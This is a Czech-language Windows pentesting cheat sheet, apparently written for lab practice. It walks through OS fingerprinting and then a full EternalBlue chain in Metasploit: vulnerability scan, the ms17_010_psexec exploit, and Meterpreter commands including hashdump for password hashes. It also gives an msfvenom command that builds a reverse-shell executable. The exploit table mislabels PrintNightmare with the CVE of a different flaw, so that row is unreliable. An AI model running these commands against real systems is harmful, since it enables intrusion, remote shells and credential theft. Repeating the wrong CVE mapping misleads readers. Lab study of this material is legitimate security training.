# 🪟 Windows Pentesting Cheat Sheet

---

# 🔍 1. Fingerprinting: Je to Windows?

Před zahájením útoku je nutné potvrdit operační systém cílového zařízení.

---

## Metoda A: ICMP TTL (Time To Live)

Nejrychlejší metoda odhadu operačního systému.

Typické hodnoty:

| OS | Výchozí TTL |
|---|---|
| Windows | 128 |
| Linux | 64 |

Pokud vidíš hodnotu blízkou **128** (například 127 po jednom hopu), pravděpodobně jde o Windows.

### Příklad:

```bash
ping 10.129.201.97
```

Výsledek:

```
64 bytes from ... ttl=128 time=102ms
```

---

## Metoda B: Nmap OS Detection

Nmap analyzuje TCP/IP stack a porovnává ho s databází operačních systémů.

```bash
sudo nmap -v -O 10.129.201.97
```

Příklad výsledku:

```
OS details:
Microsoft Windows 10 1709 - 1909
```

---

## Metoda C: Banner Grabbing

Služby často prozradí informace o systému.

Příklad:

- IIS 10.0 → Windows Server 2016/2019
- SMB → informace o Windows verzi

```bash
sudo nmap -sV --script banner.nse 10.129.201.97
```

---

# 📦 2. Windows Payload Typy

Různé formáty payloadů mají různé použití podle situace.

| Formát | Popis | Využití |
|---|---|---|
| `.DLL` | Dynamická knihovna | DLL Hijacking, Process Injection, UAC bypass techniky |
| `.BAT` | Batch soubor | Automatizace příkazů přes CMD |
| `.MSI` | Instalační balíček | Spuštění přes `msiexec`, často s vyššími právy |
| `.PS1` | PowerShell script | Moderní skripty, .NET objekty, práce v paměti |

---

# 💣 3. Významné Windows Exploity

Historické i současné chyby často používané v laboratořích.

| Exploit | CVE / ID | Služba | Popis |
|---|---|---|---|
| MS08-067 | MS08-067 | SMB | Legendární SMB chyba, využita například Confickerem |
| EternalBlue | MS17-010 | SMBv1 | Únik exploitů NSA, WannaCry ransomware |
| PrintNightmare | CVE-2021-36934 | Print Spooler | RCE přes tiskový subsystém |
| BlueKeep | CVE-2019-0708 | RDP | RCE bez autentizace |
| ZeroLogon | CVE-2020-1472 | Netlogon | Možnost kompromitace Domain Controlleru |

---

# 🚀 4. Praktický Průnik: EternalBlue Workflow

Typický řetězec:

```
Skenování
    ↓
Identifikace služby
    ↓
Ověření zranitelnosti
    ↓
Exploitace
    ↓
Shell
    ↓
Post-exploitation
```

---

# Krok 1: Skenování verzí (Nmap)

Zjistíme otevřené služby a verzi systému.

```bash
nmap -v -A 10.129.201.97
```

Příklad nálezu:

```
Port: 445
Service: SMB
OS:
Windows Server 2016 Standard 14393
```

---

# Krok 2: Ověření zranitelnosti (Metasploit)

Nejdříve ověříme, zda je SMB zranitelné.

```bash
msfconsole
```

```bash
use auxiliary/scanner/smb/smb_ms17_010

set RHOSTS 10.129.201.97

run
```

Výsledek:

```
[+] 10.129.201.97:445 - Host is likely VULNERABLE!
```

---

# Krok 3: Exploitace

Použití stabilnější varianty exploitace:

```bash
use exploit/windows/smb/ms17_010_psexec

set RHOSTS 10.129.201.97

set LHOST <Tvoje_VPN_IP>

exploit
```

---

# Krok 4: Post-Exploitace (Meterpreter)

Po získání session lze provádět další operace.

---

## Zjištění identity

```bash
getuid
```

---

## Přechod do Windows CMD

```bash
shell
```

---

## Získání hashů hesel

```bash
hashdump
```

---

# 🛠️ Arzenál pro Windows Infiltraci

## Impacket

Python framework pro práci s Windows protokoly.

Obsahuje například:

| Nástroj | Účel |
|---|---|
| `psexec.py` | Vzdálené spuštění příkazů |
| `smbclient.py` | SMB komunikace |
| `wmiexec.py` | WMI vzdálený shell |

---

## Nishang

Framework pro PowerShell post-exploitation.

Použití:

- PowerShell payloady
- Reverse shelly
- Enumerace systému

---

## msfvenom

Generování vlastních payloadů.

Příklad:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=<IP> \
LPORT=4444 \
-f exe \
-o shell.exe
```

---

# 📌 Windows Pentesting Workflow

```
1. OS Fingerprinting
        |
        ↓
2. Port Scanning
        |
        ↓
3. Service Enumeration
        |
        ↓
4. Vulnerability Assessment
        |
        ↓
5. Exploitation
        |
        ↓
6. Shell Access
        |
        ↓
7. Privilege Escalation
        |
        ↓
8. Post Exploitation
```